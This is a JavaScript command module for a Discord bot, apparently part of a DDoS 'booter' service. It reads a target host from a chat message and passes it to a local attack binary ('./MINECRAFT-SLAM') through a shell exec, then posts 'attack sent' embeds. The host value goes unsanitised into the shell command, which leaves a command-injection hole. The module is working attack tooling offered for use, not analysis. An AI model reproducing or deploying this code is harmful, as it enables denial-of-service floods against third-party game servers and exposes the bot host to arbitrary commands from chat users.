const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const duration = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex !minecraft 1.1.1.1`")
	.setFooter("Please do not attack government server!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`./MINECRAFT-SLAM ${host} 5000 5 60`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('🚀 Attack sent sucessfully to all Server! 🚀' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('?? **SAMESSE** ??')
	.setTimestamp()
  .setDescription("")
	.setFooter('� Developer: andz#111', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('?? **SAMESSE** ??')
	.setTimestamp()
	.setDescription("🚀 **Attack Under Review** 🚀")
	.setFooter('� Developer: andz#111', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['minecraft'],
  permLevel: 0
}

exports.help = {
  name: 'minecraft',
  description: 'zxcr9999',
  usage: 'minecraft'
}